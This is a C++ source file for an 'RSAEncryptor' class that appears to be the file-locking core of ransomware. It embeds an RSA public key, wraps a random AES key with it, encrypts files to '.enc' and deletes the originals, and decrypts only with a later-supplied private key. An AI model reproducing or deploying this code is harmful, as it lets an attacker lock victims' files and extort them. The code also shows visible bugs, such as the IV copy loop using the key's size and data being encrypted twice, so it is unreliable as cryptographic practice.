#include "rsaencryptor.h"


using namespace std;

const string RSAEncryptor::PUBLIC_KEY =
        "30820120300D06092A864886F70D01010105000382010D00308201080282010100"
        "C7FCEDAB7F4839920063C56836E5CD3DE28156FF76B90842A06EBA1CE0582D4722"
        "559DAEF0E8AC630EFAA66D9296D83F0ED562E502EBD883E3C9493763C1AC2EC6DF"
        "3077DB0364CBCF2FDB5987EA1B4074E89C1D9F662BB4959E450AA336EAC021C733"
        "831E14CA4214DE01B94B78BD9ACDD7A5DEAD35F78277FD4BE7FD04EBACF5CF1727"
        "B5BF9A520F18F0DEB1874ED711010314731988D219A0AF1F114BAEE765E87875E0"
        "6E2BB91DA738EF7F9B797911EB378B50BFD180127ABB5FAC53A482730DF1DFA82E"
        "07E26D97D2130EFB3E3E22649BC70D032EE7281A71E0C6E35D7FB4996667CD166F"
        "813646860C3E5C68188307DAF0111D717107AD23D7D1CC8FF3020111";

const string RSAEncryptor::SIGNED_PUBLIC_KEY =
        "55AD3DD2487831198E31D4981313DDBFE416A448ABEC99F0B2DB82DD3B27D0FA88C"
        "7E98FF05C389551631E8BACD7A5B6FF6C438C5E6E1C076DF2EE55F740EC895B5245"
        "2E8D6EE7F1FF160DF388B28D3C53A4DB39FD66F7D8C577D224A3F74CD1295208330"
        "41C78F093E7CDA61D575EAABB7F361B837ECF019A3D7F3C0A21BB2F3513D9A68C3B"
        "012E2C68150894AD7958CA22BC092FAE5D1EBB2DAC4B346B0CB201F9D63F36A0DDC"
        "C0E6BE39B0DD78945EFFBE95EBF20C2FCA4190B4A5B1A6A4DDCF4AC712E0B3C5710"
        "FB311CE3E9738D30978EAB92720492102DDFEA780A38BEEC325B1D2DCCB4737C0BF"
        "24738951EE2039D8200C21313B9078B8BCDA1A92957";


const string RSAEncryptor::SECRET_FILE = "secretkey.txt";
const string RSAEncryptor::IV_FILE = "iv.txt";

RSAEncryptor::RSAEncryptor() {
    // generate RSA Keys
    readPublicKeyFromString(PUBLIC_KEY, publicKey);
}

void RSAEncryptor::generateAESKeyAndSave() {
    // generate AES Keys
    SecByteBlock keyBlock(sizeof(keyAES));
    SecByteBlock ivBlock(sizeof(ivAES));
    OS_GenerateRandomBlock(true, keyBlock, sizeof(keyAES));
    OS_GenerateRandomBlock(true, ivBlock, sizeof(ivAES));

    for(int index = 0; index < keyBlock.SizeInBytes(); index++) {
        this->keyAES[index] = keyBlock.BytePtr()[index];
    }

    for(int index = 0; index < keyBlock.SizeInBytes(); index++) {
        this->ivAES[index] = ivBlock.BytePtr()[index];
    }

    //Write the encrypted secret in file
    unsigned long long cipherSize = 0;
    CryptoPP::byte* encryptedSecret = encryptBytes(keyAES, sizeof(keyAES), cipherSize);

    writeBytes(SECRET_FILE, encryptedSecret, cipherSize);
    writeBytes(IV_FILE, ivAES, sizeof(ivAES));

    delete[] encryptedSecret;
    encryptedSecret = NULL;
    isKeyGenerated = true;
}

void RSAEncryptor::writePublicKeyToFile(const std::string& filepath, const CryptoPP::RSA::PublicKey& key)
{
    std::ofstream file(filepath, std::ios::out | std::ios::trunc | std::ios::binary);
    if (!file.is_open())
    {
        std::cerr << "Failed to open file for writing" << std::endl;
        return;
    }

    CryptoPP::HexEncoder encoder(new CryptoPP::FileSink(file));
    key.Save(encoder);
    file.close();
}

void RSAEncryptor::writePrivateKeyToFile(const std::string& filepath, const CryptoPP::RSA::PrivateKey& key)
{
    std::ofstream file(filepath, std::ios::out | std::ios::trunc | std::ios::binary);
    if (!file.is_open())
    {
        std::cerr << "Failed to open file for writing" << std::endl;
        return;
    }

    CryptoPP::HexEncoder encoder(new CryptoPP::FileSink(file));
    key.Save(encoder);
    file.close();
}

void RSAEncryptor::readPublicKeyFromString(const std::string& key_string, RSA::PublicKey& key)
{
    CryptoPP::StringSource ss(key_string, true, new CryptoPP::HexDecoder());
    key.Load(ss);
}

void RSAEncryptor::readPrivateKeyFromString(const std::string& key_string, RSA::PrivateKey& key)
{
    CryptoPP::StringSource ss(key_string, true, new CryptoPP::HexDecoder());
    key.Load(ss);
}

void RSAEncryptor::writeBytes(const std::string& filePath, CryptoPP::byte* bytes, const size_t size) {
    ArraySource((CryptoPP::byte *)bytes, size, true, new HexEncoder(new CryptoPP::FileSink(filePath.c_str())));
}

std::string RSAEncryptor::readBytesAsStringFromFile(const std::string& filePath, string s) {
    CryptoPP::FileSource file(filePath.c_str(), true, new HexDecoder(new StringSink( s )));
    return s;
}

void RSAEncryptor::writeBytesToFile(const std::string& filepath, const CryptoPP::byte* bytes, const size_t size)
{
    std::ofstream file(filepath, std::ios::out | std::ios::binary);
    if (!file.is_open())
    {
        std::cerr << "Failed to open file for writing" << std::endl;
        return;
    }

    file.write(reinterpret_cast<const char*>(bytes), size);
    file.close();
}

void RSAEncryptor::readBytesFromFile(const std::string& filepath, CryptoPP::byte* bytes, const size_t size)
{
    std::ifstream file(filepath, std::ios::in | std::ios::binary);
    if (!file.is_open())
    {
        std::cerr << "Failed to open file for reading" << std::endl;
        return;
    }

    file.read(reinterpret_cast<char*>(bytes), size);
    file.close();
}

CryptoPP::byte* RSAEncryptor::encryptBytes(const CryptoPP::byte* data, const size_t size, size_t& cipherSize)
{
    RSAES_OAEP_SHA_Encryptor encryptor(publicKey);

    cipherSize = encryptor.CiphertextLength(size);
    CryptoPP::byte* ciphertext = new CryptoPP::byte[cipherSize];

    encryptor.Encrypt(rng, data, size, ciphertext);

    ArraySource((CryptoPP::byte *)data, size, true,
                new PK_EncryptorFilter(rng, encryptor, new ArraySink((CryptoPP::byte *)ciphertext, cipherSize)));

    return ciphertext;
}

CryptoPP::byte* RSAEncryptor::decryptBytes(const CryptoPP::byte* ciphertext, const size_t cipherSize, size_t& plainSize)
{
    RSAES_OAEP_SHA_Decryptor decryptor(privateKey);
    plainSize = decryptor.MaxPlaintextLength(cipherSize);

    CryptoPP::byte* plaintext = new CryptoPP::byte[plainSize];

    decryptor.Decrypt(rng, ciphertext, cipherSize, plaintext);

    return plaintext;
}

void RSAEncryptor::checkPrivateKey(std::string key) {
    RSA::PrivateKey privKey;

    readPrivateKeyFromString(key, privKey);
    string signature, recovered;

    StringSource(SIGNED_PUBLIC_KEY, true, new HexDecoder(new StringSink(signature)));

    // Verify and Recover
    RSASS<PSS, SHA256>::Verifier verifier(publicKey);
    StringSource ss2(PUBLIC_KEY+signature, true,
        new SignatureVerificationFilter(
            verifier,
            new HexDecoder(new StringSink(recovered)),
            SignatureVerificationFilter::THROW_EXCEPTION |
            SignatureVerificationFilter::PUT_MESSAGE
      )
    );
}

void RSAEncryptor::loadPrivateKeyAndRetrieveSecret(std::string key) {
    readPrivateKeyFromString(key, privateKey);

    std::string encSecret;
    encSecret = readBytesAsStringFromFile(SECRET_FILE, encSecret);
    std::string iv;
    iv = readBytesAsStringFromFile(IV_FILE, iv);

    unsigned long long plaintextLength = sizeof(keyAES);
    CryptoPP::byte* secret =
            decryptBytes(reinterpret_cast<const unsigned char *> (encSecret.c_str()), encSecret.size(), plaintextLength);

    for(int index = 0; index < plaintextLength; index++) {
        this->keyAES[index] = secret[index];
    }

    for(int index = 0; index < iv.size(); index++) {
        this->ivAES[index] = iv.at(index);
    }

    isKeyLoaded = true;
}

std::string RSAEncryptor::encryptFile(path filePath) {
    if(!isKeyGenerated) {
        generateAESKeyAndSave();
    }

    string newFilePath = filePath.string() + ".enc";

    // Open input and output files
    ifstream inFile(filePath.string().c_str(), ios::binary);
    ofstream outFile(newFilePath.c_str(), ios::binary);

    CBC_Mode<AES>::Encryption encryptor;
    encryptor.SetKeyWithIV(keyAES, sizeof(keyAES), ivAES);

    FileSource fs(filePath.filename().c_str(), true,
        new StreamTransformationFilter( encryptor,
            new FileSink(newFilePath.c_str() )
        )
    );

    remove(filePath);
    return newFilePath;
}

std::string RSAEncryptor::decryptFile(path filePath, const string& key ) {
    if(!isKeyLoaded) {
        loadPrivateKeyAndRetrieveSecret(key);
    }

    string newFilePath = filePath.string().substr(0, filePath.size() - 4);

    // Open input and output files
    ifstream inFile(filePath.string().c_str(), ios::binary);
    ofstream outFile(newFilePath.c_str(), ios::binary);

    CBC_Mode<AES>::Decryption decryptor;
    decryptor.SetKeyWithIV(keyAES, sizeof(keyAES), ivAES);

    FileSource fs( filePath.filename().c_str(), true,
        new StreamTransformationFilter( decryptor,
            new FileSink(newFilePath.c_str() )
        )
    );

    remove(filePath);
    return newFilePath;
}
